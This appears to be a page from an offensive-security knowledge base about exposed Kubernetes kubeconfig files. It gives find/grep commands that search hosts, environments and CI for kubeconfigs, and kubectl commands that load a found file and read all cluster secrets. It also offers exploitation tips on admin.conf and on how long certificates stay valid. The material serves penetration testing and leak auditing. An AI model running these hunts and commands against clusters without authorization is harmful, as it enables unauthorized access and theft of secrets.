---
title: "Exposed kubeconfig: cluster credentials left where an attacker finds them"
description: "A kubeconfig file holds the server address and the credentials to authenticate to it, often a client certificate or token for a powerful user. These files leak into home directories, CI variables, container images, repositories, and backups. A found kubeconfig is direct cluster access at whatever privilege the embedded credential carries, frequently cluster-admin."
keywords:
  - kubeconfig
  - cluster credentials
  - client certificate
  - kubectl config
  - credential leak
---

# Exposed kubeconfig

A kubeconfig bundles everything needed to reach a cluster: the API server URL, the cluster CA, and a credential, which is commonly a client certificate or a bearer token for a specific user or service account. Administrators' kubeconfigs frequently carry cluster-admin. These files are widely copied and poorly protected, turning up in home directories, CI/CD secrets and environment, committed to repositories, baked into images, and in backups. Finding one is direct cluster access at the credential's privilege level.

Hunt for kubeconfigs:

```bash
# standard and common locations
cat ~/.kube/config 2>/dev/null
find / -name '*.kubeconfig' -o -name 'config' -path '*/.kube/*' 2>/dev/null
find / -name 'admin.conf' -o -name 'kubelet.conf' 2>/dev/null   # on control-plane nodes
# in CI/env and images
env | grep -iE 'KUBECONFIG|KUBE_'
grep -rIl 'apiVersion: v1' / 2>/dev/null | xargs grep -l 'clusters:' 2>/dev/null | head
```

## Use the credential

```bash
export KUBECONFIG=/path/to/found/config
kubectl config view --minify                          # server, user, and credential type
kubectl auth can-i --list                             # the privilege it carries
kubectl get secrets --all-namespaces                  # if admin, read everything
```

## Exploitation notes

- `admin.conf` on a control-plane node is a cluster-admin client certificate; it is the highest-value kubeconfig and is reachable after any control-plane node compromise.
- The embedded credential type matters: a client certificate is durable and not revoked by deleting a binding, while a token may be short-lived; `kubectl config view` shows which you have.
- Kubeconfigs in Git history, image layers, and CI secrets are common; mine image layers ([Secrets in image layers](../../../runtimes/docker/images-and-registries/secrets-in-image-layers.md)) and CI environments for them.
- Always run `auth can-i --list` first to learn the privilege before acting, rather than assuming admin.

## References

- [Kubernetes: organizing cluster access with kubeconfig](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/)
- [HackTricks: Kubernetes kubeconfig](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
